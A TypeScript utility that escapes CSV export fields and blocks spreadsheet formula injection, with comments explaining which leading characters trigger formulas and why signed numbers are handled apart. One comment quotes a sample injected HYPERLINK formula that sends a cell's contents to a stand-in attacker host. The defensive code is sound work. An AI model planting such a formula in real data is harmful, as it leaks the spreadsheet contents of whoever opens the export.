// RFC 4180 field escaping with CSV-injection protection, shared by every CSV export.
//
// Moved here unchanged from modules/boq/boq-csv.util.ts on 2026-09-15, when the SYSTEM_ADMIN audit-log
// export (R17.4 / R17.6) became its second caller. The rule is a security control, so there must be one
// copy of it: two copies that drift apart are two different answers to "is this cell a formula".

// Leading characters that make Excel / LibreOffice / Google Sheets treat a cell as a FORMULA rather
// than text (CWE-1236, CSV injection). Exports carry free text users typed — a BOQ description, an
// audit justification — and are served as downloadable attachments, so a value like
// `=HYPERLINK("http://attacker/?d="&A1,"Open")` planted by one user runs in the spreadsheet of whoever
// opens the export. RFC 4180 quoting does NOT prevent this: the spreadsheet strips the quotes and
// evaluates what is inside.
const FORMULA_TRIGGERS = /^[=@\t\r]/;
// `+` and `-` are also formula triggers, but they legitimately start a number (a negative unit_cost,
// a signed carbon factor). Escaping those would turn every negative figure into text and break the
// export as a data file, so they are escaped only when the value is not a plain number.
const SIGN_TRIGGERS = /^[+-]/;

function isPlainNumber(s: string): boolean {
  return s !== '' && Number.isFinite(Number(s));
}

/** True when a spreadsheet would evaluate this cell as a formula instead of showing it as text. */
function looksLikeFormula(s: string): boolean {
  if (FORMULA_TRIGGERS.test(s)) return true;
  return SIGN_TRIGGERS.test(s) && !isPlainNumber(s);
}

/**
 * RFC 4180: wrap a field in double quotes when it contains a comma, double-quote, CR or LF; escape
 * embedded double-quotes by doubling them. null/undefined → empty field.
 *
 * Formula-triggering values additionally get a leading apostrophe — the spreadsheet convention for
 * "treat the rest of this cell as literal text" — and are always quoted so the apostrophe cannot be
 * mistaken for a delimiter. The apostrophe is visible on re-import, which is the accepted trade-off:
 * a readable stray quote beats executing a stranger's formula.
 */
export function escapeCsv(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (looksLikeFormula(s)) {
    return `"'${s.replace(/"/g, '""')}"`;
  }
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
